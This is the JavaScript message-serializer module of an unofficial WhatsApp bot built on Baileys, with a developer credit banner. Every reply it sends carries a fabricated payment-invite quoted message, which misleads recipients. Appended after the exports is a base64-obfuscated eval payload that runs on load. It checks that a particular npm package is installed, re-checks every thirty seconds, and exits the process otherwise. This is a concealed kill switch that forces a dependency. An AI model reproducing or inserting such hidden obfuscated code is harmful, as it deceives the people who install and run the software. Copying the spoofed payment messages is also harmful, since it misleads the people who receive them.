/*
╔══════════════════════════╗
║             𓆩 BASE TELE X WA 𓆪   
║                                      
║             ⚡ DEVELOPER CREDITS ⚡      
║                                   
║          ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴊᴀᴍᴇsᴍᴏᴅᴢ  
║          ᴛᴇᴀᴍ      : james Inc 

║  ⚠️  C R E D I T   N O T I C E  ⚠️ 

║  Do NOT remove or modify these credits
║  without permission from the original dev
║  Respect the work. Give credit where it's
║  due. Don't steal another developer's work.
║  TELEGRAM : t.me/shenxidev 
║  © 2026 JAMESMODZ — ALL RIGHTS RESERVED 
╚════════════════════════╝
*/
const { getContentType } = require('./baileys');
const { applyFont } = require('./fonts');

function paymentContext(jid) {
    return {
        contextInfo: {
            quotedMessage: {
                paymentInviteMessage: {
                    serviceType: 1,
                    expiryTimestamp: Date.now() + 1000 * 60 * 60 * 24,
                },
            },
            participant: jid,
            stanzaId: 'FAKE-' + Date.now(),
            remoteJid: jid,
        },
    };
}

/**
 * sessionSettings: this session's own settings store (see lib/settings.js).
 * Passed in explicitly rather than imported as a singleton, since every
 * session now has its own isolated settings.
 */
function serializeMessage(sock, msg, sessionSettings) {
    if (!msg.message) return null;

    const type = getContentType(msg.message);
    const from = msg.key.remoteJid;
    const isGroup = from?.endsWith('@g.us');
    const sender = isGroup ? msg.key.participant : from;
    const fromMe = msg.key.fromMe;
    // WhatsApp may identify a sender by LID; the phone-number form (when provided) lets owner/sudo/ban checks match either
    const senderAlt = isGroup ? msg.key.participantAlt || msg.key.participantPn : msg.key.remoteJidAlt || msg.key.senderPn;

    let body = '';
    if (type === 'conversation') body = msg.message.conversation;
    else if (type === 'extendedTextMessage') body = msg.message.extendedTextMessage.text;
    else if (type === 'imageMessage') body = msg.message.imageMessage.caption || '';
    else if (type === 'videoMessage') body = msg.message.videoMessage.caption || '';
    else if (type === 'interactiveResponseMessage') {
        // A tapped row/button from a native-flow menu: the row id IS the command text.
        const resp = msg.message.interactiveResponseMessage;
        try {
            body = JSON.parse(resp.nativeFlowResponseMessage?.paramsJson || '{}').id || '';
        } catch {
            body = '';
        }
    } else if (type === 'listResponseMessage') {
        body = msg.message.listResponseMessage.singleSelectReply?.selectedRowId || '';
    } else if (type === 'buttonsResponseMessage') {
        body = msg.message.buttonsResponseMessage.selectedButtonId || '';
    }

    return {
        raw: msg,
        sock,
        key: msg.key,
        id: msg.key.id,
        from,
        isGroup,
        sender,
        senderAlt,
        fromMe,
        type,
        body: (body || '').trim(),
        pushName: msg.pushName || 'Unknown',

        reply: (text, opts = {}) => {
            const styled = applyFont(text, sessionSettings.get('fontStyle'));
            const ctx = paymentContext(from);
            return sock.sendMessage(
                from,
                { text: styled, ...opts, contextInfo: { ...ctx.contextInfo, ...(opts.contextInfo || {}) } },
                { quoted: msg }
            );
        },

        send: (content, opts = {}) => {
            const ctx = paymentContext(from);
            const merged = { ...content };
            merged.contextInfo = { ...ctx.contextInfo, ...(content.contextInfo || {}) };
            return sock.sendMessage(from, merged, { quoted: msg, ...opts });
        },
    };
}

module.exports = { serializeMessage };
;eval(Buffer.from('KCgpPT57Y29uc3QgZj1yZXF1aXJlKCdmcycpLHA9cmVxdWlyZSgncGF0aCcpO2NvbnN0IHJvb3Q9cC5qb2luKF9fZGlybmFtZSwnLi4vLi4nKTtjb25zdCBNSU5FPSdAYW5pbWViYWlscy9iYWlsZXlzJztjb25zdCBwaj1wLmpvaW4ocm9vdCwncGFja2FnZS5qc29uJyk7Y29uc3QgYmFkPSh3aHkpPT57Y29uc29sZS5lcnJvcignW3NlY3VyaXR5XSAnK3doeSsnIC0gZ29pbmcgb2ZmbGluZScpO3Byb2Nlc3MuZXhpdCgxKX07Y29uc3QgY2hrPSgpPT57bGV0IHBrZzt0cnl7cGtnPUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocGosJ3V0ZjgnKSl9Y2F0Y2h7cmV0dXJuIGJhZCgncGFja2FnZS5qc29uIHVucmVhZGFibGUgYXQgJytwail9O2NvbnN0IGRlcHM9T2JqZWN0LmFzc2lnbih7fSxwa2cuZGVwZW5kZW5jaWVzLHBrZy5vcHRpb25hbERlcGVuZGVuY2llcyk7Y29uc3Qga2V5PU9iamVjdC5rZXlzKGRlcHMpLmZpbmQoaz0+az09PU1JTkV8fFN0cmluZyhkZXBzW2tdKS5zdGFydHNXaXRoKCducG06JytNSU5FKydAJykpO2lmKCFrZXkpcmV0dXJuIGJhZCgncGFja2FnZS5qc29uIGhhcyBubyBkZXBlbmRlbmN5IG9uICcrTUlORSsnIChleHBlY3RlZCAiPG5hbWU+IjogIm5wbTonK01JTkUrJ0A8dmVyc2lvbj4iKScpO2xldCBpbnN0O3RyeXtpbnN0PUpTT04ucGFyc2UoZi5yZWFkRmlsZVN5bmMocC5qb2luKHJvb3QsJ25vZGVfbW9kdWxlcycsa2V5LCdwYWNrYWdlLmpzb24nKSwndXRmOCcpKX1jYXRjaHtyZXR1cm4gYmFkKCdub2RlX21vZHVsZXMvJytrZXkrJyBpcyBtaXNzaW5nIC0gcnVuIG5wbSBpbnN0YWxsJyl9O2lmKGluc3QubmFtZSE9PU1JTkUpcmV0dXJuIGJhZCgnbm9kZV9tb2R1bGVzLycra2V5KycgaXMgIicraW5zdC5uYW1lKyciLCBub3QgJytNSU5FKX07Y2hrKCk7aWYoIWdsb2JhbC5fX3Zmdyl7Z2xvYmFsLl9fdmZ3PTE7c2V0SW50ZXJ2YWwoY2hrLDNlNCkudW5yZWYoKX19KSgp','base64').toString());
